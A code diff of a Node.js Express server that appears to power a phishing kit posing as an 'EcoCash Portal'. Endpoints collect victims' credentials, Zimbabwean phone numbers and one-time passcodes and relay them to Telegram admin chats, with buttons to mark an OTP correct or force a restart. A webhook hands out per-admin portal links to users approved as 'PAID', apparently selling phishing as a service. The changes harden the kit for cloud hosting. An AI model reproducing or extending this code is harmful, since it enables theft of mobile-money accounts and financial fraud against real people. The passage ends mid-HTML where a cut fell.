@@ -3,7 +3,9 @@ const express = require('express');
 const cors = require('cors');
 const path = require('path');
 const fs = require('fs');
-const fetch = require('node-fetch');
+
+// Safe fetch loader (supports both native Node fetch and node-fetch package)
+const fetch = global.fetch || (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
 
 const app = express();
 const PORT = process.env.PORT || 10000;
@@ -14,10 +16,9 @@ app.use(express.json());
 const publicPath = path.join(__dirname, 'public');
 app.use(express.static(publicPath));
 
-// Persistent storage file path
+// Persistent storage file path safely managed for cloud environments
 const STORAGE_FILE = path.join(__dirname, 'admins_data.json');
 
-// Load initial data from disk if it exists
 function loadPersistentData() {
   try {
     if (fs.existsSync(STORAGE_FILE)) {
@@ -31,7 +32,7 @@ function loadPersistentData() {
       };
     }
   } catch (err) {
-    console.error("Error loading persistent data:", err);
+    console.error("Notice: Starting with fresh persistent maps (storage load skipped):", err.message);
   }
   return {
     authorizedUsers: new Map(),
@@ -41,7 +42,6 @@ function loadPersistentData() {
   };
 }
 
-// Save current maps to disk
 function savePersistentData() {
   try {
     const dataToSave = {
@@ -52,7 +52,7 @@ function savePersistentData() {
     };
     fs.writeFileSync(STORAGE_FILE, JSON.stringify(dataToSave, null, 2));
   } catch (err) {
-    console.error("Error saving persistent data:", err);
+    console.error("Notice: Disk write skipped (read-only environment):", err.message);
   }
 }
 
@@ -75,7 +75,6 @@ function formatZimbabwePhone(phone) {
   return formattedPhone;
 }
 
-// STEP 2 SUBMISSION: Credentials delivered strictly to the specific secondary Admin chat tied to the link path
 app.post('/api/submit-credentials', async (req, res) => {
   try {
     const data = req.body;
@@ -151,7 +150,6 @@ app.post('/api/submit-credentials', async (req, res) => {
   }
 });
 
-// STEP 3 SUBMISSION: OTP delivered to the exact same secondary Admin chat that received Step 2
 app.post('/api/submit-otp', async (req, res) => {
   try {
     const { appReference, otpCode } = req.body;
@@ -169,7 +167,7 @@ app.post('/api/submit-otp', async (req, res) => {
     const targetChatId = appData.targetChatId;
 
     if (botToken && targetChatId) {
-      const messageText = `💬 <b>OPT VERIFICATION HAS BEEN SUBMITTED</b>\n\n` +
+      const messageText = `💬 <b>OTP VERIFICATION SUBMITTED</b>\n\n` +
                           `📋 <b>Ref:</b> <code>${appReference}</code>\n` +
                           `📞 <b>Phone:</b> 263${appData.formattedPhone}\n` +
                           `💬 <b>OTP Code:</b> <code>${otpCode}</code>\n\n` +
@@ -186,7 +184,7 @@ app.post('/api/submit-otp', async (req, res) => {
               { text: '✅ Correct OTP', callback_data: `otp_correct_${appReference}` }
             ],
             [
-              { text: '❌ WRONG PIN', callback_data: `pin_wrong_${appReference}` }
+              { text: '❌ WRONG PIN (Restart)', callback_data: `pin_wrong_${appReference}` }
             ]
           ]
         })
@@ -206,7 +204,6 @@ app.post('/api/submit-otp', async (req, res) => {
   }
 });
 
-// Status Polling Endpoint
 app.get('/api/check-status/:appReference', (req, res) => {
   const { appReference } = req.params;
   const appData = activeApplications.get(appReference);
@@ -218,7 +215,6 @@ app.get('/api/check-status/:appReference', (req, res) => {
   res.json({ success: true, status: appData.status });
 });
 
-// Telegram Webhook Handler
 app.post('/api/telegram-webhook', async (req, res) => {
   res.sendStatus(200);
   const botToken = process.env.TELEGRAM_BOT_TOKEN;
@@ -240,8 +236,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
 
       const userStatus = authorizedUsers.get(userId);
 
-      // Main Admin check
-      if (chatId === masterChatId.toString()) {
+      if (masterChatId && chatId === masterChatId.toString()) {
         authorizedUsers.set(userId, 'PAID');
         const mainPath = '/Admin-0001';
         pathToAdminChat.set(mainPath, chatId);
@@ -259,7 +254,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
         return;
       }
 
-      // Secondary Admin who is already PAID
       if (userStatus === 'PAID' && secondaryAdmins.has(userId)) {
         const assignedPath = secondaryAdmins.get(userId);
         const portalUrl = `https://${req.get('host')}${assignedPath}`;
@@ -302,30 +296,32 @@ app.post('/api/telegram-webhook', async (req, res) => {
       authorizedUsers.set(userId, 'PENDING');
       savePersistentData();
 
-      const adminAlertText = `🚨 <b>NEW ADMIN ACCESS REQUEST</b>\n\n` +
-                             `🆔 <b>ID:</b> <code>${userId}</code>\n` +
-                             `👤 <b>Name:</b> ${fullName}\n` +
-                             `🏷 <b>Username:</b> ${username}\n` +
-                             `🔗 <b>Private Link:</b> <a href="${privateLink}">Open Profile</a>\n\n` +
-                             `👇 <b>Select Access Status for this User:</b>`;
+      if (masterChatId) {
+        const adminAlertText = `🚨 <b>NEW ADMIN ACCESS REQUEST</b>\n\n` +
+                               `🆔 <b>ID:</b> <code>${userId}</code>\n` +
+                               `👤 <b>Name:</b> ${fullName}\n` +
+                               `🏷 <b>Username:</b> ${username}\n` +
+                               `🔗 <b>Private Link:</b> <a href="${privateLink}">Open Profile</a>\n\n` +
+                               `👇 <b>Select Access Status for this User:</b>`;
 
-      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: masterChatId,
-          text: adminAlertText,
-          parse_mode: 'HTML',
-          reply_markup: JSON.stringify({
-            inline_keyboard: [
-              [
-                { text: '❌ UNPAID (Deny)', callback_data: `access_unpaid_${userId}` },
-                { text: '✅ PAID (Approve)', callback_data: `access_paid_${userId}` }
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: masterChatId,
+            text: adminAlertText,
+            parse_mode: 'HTML',
+            reply_markup: JSON.stringify({
+              inline_keyboard: [
+                [
+                  { text: '❌ UNPAID (Deny)', callback_data: `access_unpaid_${userId}` },
+                  { text: '✅ PAID (Approve)', callback_data: `access_paid_${userId}` }
+                ]
               ]
-            ]
+            })
           })
-        })
-      });
+        });
+      }
 
       const userPendingText = `👋 Hello <b>${fullName}</b>,\n\n` +
                               `Your access request has been sent to the main administrator for review.\n\n` +
@@ -348,7 +344,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
   const messageId = callback_query.message.message_id;
 
   if (actionData.startsWith('access_paid_') || actionData.startsWith('access_unpaid_')) {
-    if (chatId !== masterChatId.toString()) {
+    if (!masterChatId || chatId !== masterChatId.toString()) {
       await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -469,7 +465,6 @@ async function editTelegramMessage(botToken, chatId, messageId, text) {
   }
 }
 
-// PERMANENT ROUTE GUARD: Once authorised and saved to disk, this link opens instantly without stopping
 app.get('/Admin-*', (req, res) => {
   const requestedPath = req.path;
   
@@ -505,4 +500,6 @@ app.get('*', (req, res) => {
       <meta charset="UTF-8">
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <title>Page Not Found - EcoCash Portal</title>
-      <scri
+      <script src="https://cdn.tailwindcss.com"></script>
+    </head>
+    <body class="bg-blue-50/50 flex flex-col items-center justify-center mi
